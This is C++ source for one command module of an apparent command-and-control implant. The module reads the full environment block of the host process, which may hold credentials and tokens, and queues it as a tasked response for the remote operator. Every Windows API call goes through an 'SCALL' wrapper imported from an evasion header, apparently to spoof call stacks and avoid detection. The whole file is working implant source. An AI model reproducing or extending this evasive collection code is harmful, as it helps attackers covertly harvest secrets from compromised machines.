#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <evasion/spoof_dispatch.h>

#ifdef INCLUDE_CMD_ENV

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_env(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    (void)params;

    auto env_block = (LPWCH)SCALL( inst, kernel32.GetEnvironmentStringsW );
    if ( !env_block ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetEnvironmentStringsW failed" ) ) );
        return;
    }

    // calculate total size of env block (double-null terminated)
    uint32_t total_wchars = 0;
    auto p = env_block;
    while ( *p ) {
        uint32_t entry_len = (DWORD)SCALL( inst, kernel32.lstrlenW, p );
        total_wchars += entry_len + 1;
        p += entry_len + 1;
    }

    // convert to UTF-8 with newlines between entries
    uint32_t buf_size = total_wchars * 4 + 1;
    auto output = static_cast<char*>( inst.heap_alloc( buf_size ) );
    if ( !output ) {
        SCALL( inst, kernel32.FreeEnvironmentStringsW, env_block );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    uint32_t offset = 0;
    p = env_block;
    while ( *p ) {
        uint32_t entry_len = (DWORD)SCALL( inst, kernel32.lstrlenW, p );
        int converted = (int)SCALL( inst, kernel32.WideCharToMultiByte,
            CP_UTF8, 0, p, entry_len, output + offset, buf_size - offset - 2, nullptr, nullptr );
        offset += converted;
        output[offset++] = '\n';
        p += entry_len + 1;
    }
    output[offset] = '\0';

    SCALL( inst, kernel32.FreeEnvironmentStringsW, env_block );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
